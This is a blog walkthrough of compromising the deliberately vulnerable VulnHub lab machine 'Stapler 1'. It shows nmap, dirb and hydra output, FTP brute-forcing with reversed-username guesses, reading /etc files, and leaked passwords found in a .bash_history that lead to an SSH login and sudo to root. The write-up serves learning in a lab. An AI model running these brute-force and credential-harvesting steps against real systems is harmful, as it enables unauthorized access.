<html>

<?php include '../header.php';?>

<body>

<?php include '../navbar.php';?>

    <div class="body-content">
        <h3>
            Stapler 1  
        </h3>
        <img class="headerpic" src="http://placekitten.com/200/300" alt="Hack the Planet" height="200px" width="300px" align="middle" align="left">
        <p class="text">
            This VM was created by <a href="https://twitter.com/g0tmi1k">@g0tmi1k</a>.  This VM was on a friend's network and I was given the IP address.  This was one of the earlier VulnHub machines that has a TON of writeups available.
            I wanted to share my methodology to rooting the box.  I remember this one being a lot harder three years ago.  It made me realize that I've gotten better! The VM can be downloaded:<a href="https://www.vulnhub.com/entry/stapler-1,150/">here</a>.
        </p>
        <p class="text">
            First, I ran my (bash) enumeration script and exacmined the nmap scan. 
        </p>
        <pre>
# Nmap 7.80 scan initiated Fri Feb 21 18:33:25 2020 as: nmap -p- -T5 -Pn --host-timeout 9999999m -oN nmap.full.scan -sV 10.20.40.33
Warning: 10.20.40.33 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.20.40.33
Host is up (0.029s latency).
Not shown: 65523 filtered ports
PORT      STATE  SERVICE     VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp         vsftpd 2.0.8 or later
22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
53/tcp    open   tcpwrapped
80/tcp    open   http        PHP cli server 5.5 or later
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
666/tcp   open   doom?
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
        </pre>
        <p class="text">
            There are quite a few services available, which is atypical for a boot to root machine, but it was nice to enumerate a few different services.  First, I logged in through FTP, which allowed anonymous login.
            Only one file ("note") was in the FTP directory:  Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
        </p>
        <pre>
         Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
        </pre>
        <p class="text">
            At this point, I add the usernames "elly" and "john" into a "users.txt" file in my notes directory.  We're going to start collecting these.  Next, I attempted login to SSH to view the banner.  Here, I saw another username "barry".  Add it to the list!
        </p>
        <pre>
root@kali:~/stapler1# ssh root@10.20.40.33
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
root@10.20.40.33's password: 
        </pre>
        <p class="text">
            Other than a username, there were no other clues there.   Another dead end.  Next, I looked at the two HTTP services on port 80 and port 12380.  The enumeration script I ran earlier launched dirb and nikto against them.  Port 12380 didn't discover any directories, however, two files were found in the PHP web server in port 80.
        </p>
        <pre>
root@kali:~/stapler1# cat dirb.10.20.40.33.80.txt 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: dirb.10.20.40.33.80.txt
START_TIME: Fri Feb 21 18:17:15 2020
URL_BASE: http://10.20.40.33:80/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.20.40.33:80/ ----
+ http://10.20.40.33:80/.bashrc (CODE:200|SIZE:3771)
+ http://10.20.40.33:80/.profile (CODE:200|SIZE:675)

-----------------
END_TIME: Fri Feb 21 18:41:11 2020
DOWNLOADED: 4612 - FOUND: 2
        </pre>
        <p class="text">
            The other day I learned that PHP had its own web server module akin to Python HTTP server.  The nmap service versioning detected "PHP cli server 5.5 or later".  
            This probably isn't a robust web server and is likely serving a single directory.  The results of the directory busting suggests that the root directory is some sort of /home/ directory.
            It doesn't look like there are any other interesting files.  On the other hand, within the Apache service on port 12380, I reach another dead end.  All of the directories point to the same index.html page.  
            Looking at the comments, another username "zoe" is discovered in the comments with another username in the "title" tag.
        </p>
        <pre>
root@kali:~/stapler1# curl -s http://10.20.40.33:12380/ | grep '&lt;!--'
&lt;!-- Credit: http://www.creative-tim.com/product/coming-sssoon-page --&gt;
&lt;!-- A message from the head of our HR department, Zoe, if you are looking at this, we want to hire you! --&gt;
&lt;!--    Change the image source '/images/default.jpg' with your favourite image.     --&gt;
&lt;!--   You can change the black color for the filter with those colors: blue, green, red, orange       --&gt;
&lt;!--  H1 can have 2 designs: "logo" and "logo cursive"  
        </pre>
        <p class="text">
            At this point, I didn't know what else to do, I initiated a brute force attack.  Since SSH is much slower to brute than FTP, I targeted FTP.
        </p>
        <pre>
root@kali:~/stapler1# hydra -vV -e nsr -L users.txt -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10.txt ftp://10.20.40.33
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-02-23 14:34:36
[DATA] max 16 tasks per 1 server, overall 16 tasks, 351 login tries (l:27/p:13), ~22 tries per task
[DATA] attacking ftp://10.20.40.33:21/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target 10.20.40.33 - login "zoe" - pass "zoe" - 1 of 351 [child 0] (0/0)
[ATTEMPT] target 10.20.40.33 - login "zoe" - pass "" - 2 of 351 [child 1] (0/0)
[ATTEMPT] target 10.20.40.33 - login "zoe" - pass "eoz" - 3 of 351 [child 2] (0/0)
[ATTEMPT] target 10.20.40.33 - login "zoe" - pass "123456" - 4 of 351 [child 3] (0/0)
[ATTEMPT] target 10.20.40.33 - login "zoe" - pass "password" - 5 of 351 [child 4] (0/0)
[ATTEMPT] target 10.20.40.33 - login "zoe" - pass "12345678" - 6 of 351 [child 5] (0/0)
[ATTEMPT] target 10.20.40.33 - login "zoe" - pass "qwerty" - 7 of 351 [child 6] (0/0)
[ATTEMPT] target 10.20.40.33 - login "zoe" - pass "123456789" - 8 of 351 [child 7] (0/0)
[ATTEMPT] target 10.20.40.33 - login "zoe" - pass "12345" - 9 of 351 [child 8] (0/0)
[ATTEMPT] target 10.20.40.33 - login "zoe" - pass "1234" - 10 of 351 [child 9] (0/0)
[ATTEMPT] target 10.20.40.33 - login "zoe" - pass "111111" - 11 of 351 [child 10] (0/0)
[ATTEMPT] target 10.20.40.33 - login "zoe" - pass "1234567" - 12 of 351 [child 11] (0/0)
[ATTEMPT] target 10.20.40.33 - login "zoe" - pass "dragon" - 13 of 351 [child 12] (0/0)
[ATTEMPT] target 10.20.40.33 - login "jim" - pass "jim" - 14 of 351 [child 13] (0/0)
[ATTEMPT] target 10.20.40.33 - login "jim" - pass "" - 15 of 351 [child 14] (0/0)
[ATTEMPT] target 10.20.40.33 - login "jim" - pass "mij" - 16 of 351 [child 15] (0/0)
[ATTEMPT] target 10.20.40.33 - login "jim" - pass "123456" - 17 of 351 [child 15] (0/0)
[ATTEMPT] target 10.20.40.33 - login "jim" - pass "password" - 18 of 351 [child 13] (0/0)
[ATTEMPT] target 10.20.40.33 - login "jim" - pass "12345678" - 19 of 351 [child 14] (0/0)
[ATTEMPT] target 10.20.40.33 - login "jim" - pass "qwerty" - 20 of 351 [child 8] (0/0)
[ATTEMPT] target 10.20.40.33 - login "jim" - pass "123456789" - 21 of 351 [child 0] (0/0)
[ATTEMPT] target 10.20.40.33 - login "jim" - pass "12345" - 22 of 351 [child 1] (0/0)
[ATTEMPT] target 10.20.40.33 - login "jim" - pass "1234" - 23 of 351 [child 2] (0/0)
[ATTEMPT] target 10.20.40.33 - login "jim" - pass "111111" - 24 of 351 [child 3] (0/0)
[ATTEMPT] target 10.20.40.33 - login "jim" - pass "1234567" - 25 of 351 [child 4] (0/0)
[ATTEMPT] target 10.20.40.33 - login "jim" - pass "dragon" - 26 of 351 [child 6] (0/0)
[ATTEMPT] target 10.20.40.33 - login "harry" - pass "harry" - 27 of 351 [child 10] (0/0)
[ATTEMPT] target 10.20.40.33 - login "harry" - pass "" - 28 of 351 [child 5] (0/0)
[ATTEMPT] target 10.20.40.33 - login "harry" - pass "yrrah" - 29 of 351 [child 7] (0/0)
[ATTEMPT] target 10.20.40.33 - login "harry" - pass "123456" - 30 of 351 [child 9] (0/0)
[ATTEMPT] target 10.20.40.33 - login "harry" - pass "password" - 31 of 351 [child 11] (0/0)
[ATTEMPT] target 10.20.40.33 - login "harry" - pass "12345678" - 32 of 351 [child 12] (0/0)
[ATTEMPT] target 10.20.40.33 - login "harry" - pass "qwerty" - 33 of 351 [child 13] (0/0)
[ATTEMPT] target 10.20.40.33 - login "harry" - pass "123456789" - 34 of 351 [child 15] (0/0)
[ATTEMPT] target 10.20.40.33 - login "harry" - pass "12345" - 35 of 351 [child 14] (0/0)
[ATTEMPT] target 10.20.40.33 - login "harry" - pass "1234" - 36 of 351 [child 8] (0/0)
[ATTEMPT] target 10.20.40.33 - login "harry" - pass "111111" - 37 of 351 [child 1] (0/0)
[ATTEMPT] target 10.20.40.33 - login "harry" - pass "1234567" - 38 of 351 [child 6] (0/0)
[ATTEMPT] target 10.20.40.33 - login "harry" - pass "dragon" - 39 of 351 [child 0] (0/0)
[ATTEMPT] target 10.20.40.33 - login "elly" - pass "elly" - 40 of 351 [child 2] (0/0)
[ATTEMPT] target 10.20.40.33 - login "elly" - pass "" - 41 of 351 [child 3] (0/0)
[ATTEMPT] target 10.20.40.33 - login "elly" - pass "ylle" - 42 of 351 [child 4] (0/0)
[ATTEMPT] target 10.20.40.33 - login "elly" - pass "123456" - 43 of 351 [child 5] (0/0)
[ATTEMPT] target 10.20.40.33 - login "elly" - pass "password" - 44 of 351 [child 7] (0/0)
[ATTEMPT] target 10.20.40.33 - login "elly" - pass "12345678" - 45 of 351 [child 9] (0/0)
[ATTEMPT] target 10.20.40.33 - login "elly" - pass "qwerty" - 46 of 351 [child 10] (0/0)
[ATTEMPT] target 10.20.40.33 - login "elly" - pass "123456789" - 47 of 351 [child 11] (0/0)
[ATTEMPT] target 10.20.40.33 - login "elly" - pass "12345" - 48 of 351 [child 12] (0/0)
[21][ftp] host: 10.20.40.33   login: elly   password: ylle
        </pre>
        <p class="text">
            We got a hit!  Great!  And I didn't even need a password list. Hydra's "-e nsr" option tries the username in reverse.  I FTP'd into the machine as the user Elly and found something that I've never seen before.  It looked like Elly had read access to the "/etc" folder.  Unfortunately, there was no write access.
            This was interesting.  I'd seen a similar situation in the OSCP labs.  In fact, I heard a rumor that g0tmi1k actually created that particular box.  Anyways, I downloaded the following files:
            <ul>
                <li>/etc/passwd</li>
                <li>/etc/group</li>
                <li>/etc/ssh/sshd_config</li>
                <li>/etc/apache2/apache2.conf</li>
                <li>/etc/issue</li>
                <li>/etc/resolv.conf</li>
            </ul>
            I didn't get a ton of information, but the biggest clue I recieved was in the passwd file, where I discovered a list of a dozen or so new usernames.  Before another round of brute force hydra, I wanted to look into the service on port 666.
            Connecting with netcat, the port returned a bunch of garbage with a plaintext string, "message2.jpg".  Maybe this is a file? To confirm, I ran the following commands:
        </p>
        <pre>
            root@kali:~/Documents/aptlab/stapler1# nc -nv 10.20.40.33 666 > mystery.txt
Connection to 10.20.40.33 666 port [tcp/*] succeeded!
^C
root@kali:~/Documents/aptlab/stapler1# file mystery.txt 
mystery.txt: Zip archive data, at least v2.0 to extract
root@kali:~/Documents/aptlab/stapler1# mv mystery.txt mystery.zip
root@kali:~/Documents/aptlab/stapler1# unzip mystery.zip 
Archive:  mystery.zip
  inflating: message2.jpg            
root@kali:~/Documents/aptlab/stapler1# firefox message2.jpg
        </pre>
        <p class="text">
            I thought this was going to be a major breakthrough, but the image was just a terminal with a message for "Scott" and a segmentation fault.  I ran hydra again with the new usernames.  This time, it worked without a specified password list.
        </p>
        <pre>
            root@kali:~/Documents/aptlab/stapler1# hydra -vV -e nsr -L users.txt ftp://10.20.40.33
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-02-23 14:40:47
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 81 login tries (l:27/p:3), ~6 tries per task
[DATA] attacking ftp://10.20.40.33:21/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target 10.20.40.33 - login "zoe" - pass "zoe" - 1 of 81 [child 0] (0/0)
[ATTEMPT] target 10.20.40.33 - login "zoe" - pass "" - 2 of 81 [child 1] (0/0)
[ATTEMPT] target 10.20.40.33 - login "zoe" - pass "eoz" - 3 of 81 [child 2] (0/0)
[ATTEMPT] target 10.20.40.33 - login "jim" - pass "jim" - 4 of 81 [child 3] (0/0)
[ATTEMPT] target 10.20.40.33 - login "jim" - pass "" - 5 of 81 [child 4] (0/0)
[ATTEMPT] target 10.20.40.33 - login "jim" - pass "mij" - 6 of 81 [child 5] (0/0)
[ATTEMPT] target 10.20.40.33 - login "harry" - pass "harry" - 7 of 81 [child 6] (0/0)
[ATTEMPT] target 10.20.40.33 - login "harry" - pass "" - 8 of 81 [child 7] (0/0)
[ATTEMPT] target 10.20.40.33 - login "harry" - pass "yrrah" - 9 of 81 [child 8] (0/0)
[ATTEMPT] target 10.20.40.33 - login "elly" - pass "elly" - 10 of 81 [child 9] (0/0)
[ATTEMPT] target 10.20.40.33 - login "elly" - pass "" - 11 of 81 [child 10] (0/0)
[ATTEMPT] target 10.20.40.33 - login "elly" - pass "ylle" - 12 of 81 [child 11] (0/0)
[ATTEMPT] target 10.20.40.33 - login "john" - pass "john" - 13 of 81 [child 12] (0/0)
[ATTEMPT] target 10.20.40.33 - login "john" - pass "" - 14 of 81 [child 13] (0/0)
[ATTEMPT] target 10.20.40.33 - login "john" - pass "nhoj" - 15 of 81 [child 14] (0/0)
[ATTEMPT] target 10.20.40.33 - login "scott" - pass "scott" - 16 of 81 [child 15] (0/0)
[21][ftp] host: 10.20.40.33   login: elly   password: ylle
[ATTEMPT] target 10.20.40.33 - login "scott" - pass "" - 17 of 81 [child 11] (0/0)
[ATTEMPT] target 10.20.40.33 - login "scott" - pass "ttocs" - 18 of 81 [child 7] (0/0)
[ATTEMPT] target 10.20.40.33 - login "barry" - pass "barry" - 19 of 81 [child 6] (0/0)
[ATTEMPT] target 10.20.40.33 - login "barry" - pass "" - 20 of 81 [child 14] (0/0)
[ATTEMPT] target 10.20.40.33 - login "barry" - pass "yrrab" - 21 of 81 [child 15] (0/0)
[ATTEMPT] target 10.20.40.33 - login "RNunemaker" - pass "RNunemaker" - 22 of 81 [child 3] (0/0)
[ATTEMPT] target 10.20.40.33 - login "RNunemaker" - pass "" - 23 of 81 [child 4] (0/0)
[ATTEMPT] target 10.20.40.33 - login "RNunemaker" - pass "rekamenuNR" - 24 of 81 [child 5] (0/0)
[ATTEMPT] target 10.20.40.33 - login "ETollefson" - pass "ETollefson" - 25 of 81 [child 8] (0/0)
[ATTEMPT] target 10.20.40.33 - login "ETollefson" - pass "" - 26 of 81 [child 12] (0/0)
[ATTEMPT] target 10.20.40.33 - login "ETollefson" - pass "nosfelloTE" - 27 of 81 [child 13] (0/0)
[ATTEMPT] target 10.20.40.33 - login "DSwanger" - pass "DSwanger" - 28 of 81 [child 2] (0/0)
[ATTEMPT] target 10.20.40.33 - login "DSwanger" - pass "" - 29 of 81 [child 9] (0/0)
[ATTEMPT] target 10.20.40.33 - login "DSwanger" - pass "regnawSD" - 30 of 81 [child 0] (0/0)
[ATTEMPT] target 10.20.40.33 - login "AParnell" - pass "AParnell" - 31 of 81 [child 1] (0/0)
[ATTEMPT] target 10.20.40.33 - login "AParnell" - pass "" - 32 of 81 [child 10] (0/0)
[ATTEMPT] target 10.20.40.33 - login "AParnell" - pass "llenraPA" - 33 of 81 [child 11] (0/0)
[ATTEMPT] target 10.20.40.33 - login "SHayslett" - pass "SHayslett" - 34 of 81 [child 7] (0/0)
[ATTEMPT] target 10.20.40.33 - login "SHayslett" - pass "" - 35 of 81 [child 6] (0/0)
[ATTEMPT] target 10.20.40.33 - login "SHayslett" - pass "ttelsyaHS" - 36 of 81 [child 14] (0/0)
[ATTEMPT] target 10.20.40.33 - login "MBassin" - pass "MBassin" - 37 of 81 [child 15] (0/0)
[ATTEMPT] target 10.20.40.33 - login "MBassin" - pass "" - 38 of 81 [child 3] (0/0)
[ATTEMPT] target 10.20.40.33 - login "MBassin" - pass "nissaBM" - 39 of 81 [child 5] (0/0)
[ATTEMPT] target 10.20.40.33 - login "JBare" - pass "JBare" - 40 of 81 [child 2] (0/0)
[ATTEMPT] target 10.20.40.33 - login "JBare" - pass "" - 41 of 81 [child 4] (0/0)
[ATTEMPT] target 10.20.40.33 - login "JBare" - pass "eraBJ" - 42 of 81 [child 13] (0/0)
[ATTEMPT] target 10.20.40.33 - login "LSolum" - pass "LSolum" - 43 of 81 [child 8] (0/0)
[ATTEMPT] target 10.20.40.33 - login "LSolum" - pass "" - 44 of 81 [child 12] (0/0)
[21][ftp] host: 10.20.40.33   login: SHayslett   password: SHayslett
[ATTEMPT] target 10.20.40.33 - login "LSolum" - pass "muloSL" - 45 of 81 [child 7] (0/0)
[ATTEMPT] target 10.20.40.33 - login "MFrei" - pass "MFrei" - 46 of 81 [child 0] (0/0)
        </pre>
        <p class="text">
            With these credentials (SHayslett:SHayslett), I could SSH into the system.  Nothing interesting was in the user's home directory, but SHayslett seemed to have access to quite a few other home directories.
            There were dozens of users on the system.  There seemed to be a few interesting processes running (output truncated):
        </p>
        <pre>
               SHayslett@red:~$ ps -aef
root       792     1  0  2019 ?        00:00:00 /usr/sbin/sshd -D
root       811     1  0  2019 ?        00:00:04 /usr/sbin/vsftpd /etc/vsftpd.conf
nobody     929     1  0  2019 ?        00:00:00 /usr/sbin/atftpd --daemon --tftpd-timeout 300 --retry-timeout 5 --mcast-port 1758 --mcast-addr 239.239.239.0-25
postfix   1329  1327  0  2019 ?        00:00:06 qmgr -l -t unix -u
root      1358     1  0  2019 ?        00:00:00 /bin/bash /root/python.sh
root      1360     1  0  2019 ?        00:00:00 /bin/bash /usr/local/src/nc.sh
root      1362     1  0  2019 ?        00:00:00 su -c authbind php -S 0.0.0.0:80 -t /home/www/ &>/dev/null www
root      1370  1358  0  2019 ?        00:00:00 su -c cd /home/JKanode; python2 -m SimpleHTTPServer 8888 &>/dev/null JKanode
JKanode   1393  1386  0  2019 ?        00:00:00 (sd-pam)
www       1398  1362  0  2019 ?        00:00:00 bash -c authbind php -S 0.0.0.0:80 -t /home/www/ &>/dev/null
www       1399  1398  0  2019 ?        00:04:44 php -S 0.0.0.0:80 -t /home/www/
JKanode   1400  1370  0  2019 ?        00:00:00 bash -c cd /home/JKanode; python2 -m SimpleHTTPServer 8888 &>/dev/null
JKanode   1401  1400  0  2019 ?        00:21:05 python2 -m SimpleHTTPServer 8888
www-data 22477  1099  0 06:25 ?        00:00:00 /usr/sbin/apache2 -k start
       </pre>
        <p class="text">
            I shortened the output of this command to the processes I found interesting.  Here, we see the processes for the FTP, SSH, a phantom "python.sh" process that may or may not be running the SimpleHTTPServer.
            By the way, what is this "SimpleHTTPServer" running on localhost?  We can also see the PHP web server running on port 80 and a random "nc.sh" program running.  I tried to make a curl request to access the service on localhost:8888.
            Unfortunately, this request failed.  I'm not sure why.   Instead, I attempted to browse to /home/JKanode and was surprised what I found!
        </p>
        <pre>
            SHayslett@red:~$ cd /home/JKanode
SHayslett@red:/home/JKanode$ ls -al
total 28
drwxr-xr-x  3 JKanode JKanode 4096 Feb 26  2018 .
drwxr-xr-x 32 root    root    4096 Jun  4  2016 ..
-rw-r--r--  1 JKanode JKanode  190 Feb 26  2018 .bash_history
-rw-r--r--  1 JKanode JKanode  220 Sep  1  2015 .bash_logout
-rw-r--r--  1 JKanode JKanode 3771 Sep  1  2015 .bashrc
drwx------  2 JKanode JKanode 4096 Feb 26  2018 .cache
-rw-r--r--  1 JKanode JKanode  675 Sep  1  2015 .profile
SHayslett@red:/home/JKanode$ cd .cache
-bash: cd: .cache: Permission denied
SHayslett@red:/home/JKanode$ cat .bash_history
id
whoami
ls -lah
pwd
ps aux
sshpass -p thisimypassword ssh JKanode@localhost
apt-get install sshpass
sshpass -p JZQuyIN5 peter@localhost
ps -ef
top
kill -9 3747
exit
id
ls -la
sudo -i
exit
SHayslett@red:/home/JKanode$ 
        </pre>
        <p class="text">
            As you can see, within the .bash_history file, two passwords are leaked.  One password is for login as JKanode.  The other is for a user named "peter".  To test if this is the case, we can try login as peter.
        </p>
        <pre>
root@kali:~/Documents/aptlab/stapler1# sshpass -p JZQuyIN5 ssh peter@10.20.40.33
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
Welcome back!


red% whoami
peter
red% sudo su

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for peter: 
➜  peter whoami
root
➜  peter cd /root/
➜  ~ cat flag.txt 
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)  
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b

➜  ~ 
        </pre>
        <p class="text">
            From here, the rest was pretty easy.  Once logged in as peter, the first thing I tried (and the first thing I suggest you try when logged in with credentials) is to check the user's sudo privileges.
            To my surprise, the user peter could elevate privileges to root! There were some other rabbit holes I went down including pillaging the mysql database and cracking WordPress passwords, but none were as easy/fruitful as this method.
        </p>
        <p class="text">
            Overall, this VulnHub box was extremely enjoyable the second time around.  Normally, I dislike boot to root boxes where brute force is an intended method, but the spattering of names and usernames across services really helped keep me motivated. 
            It was kind of like collecting easter eggs along the way.  Thank you, g0tmi1k for Stapler 1, your Alpha writeup, and your Linux privilege escalation guide.  I have learned many things from you over the last few years.
        </p>


    </div>


</body>
<?php include '../footer.php';?>
</html>
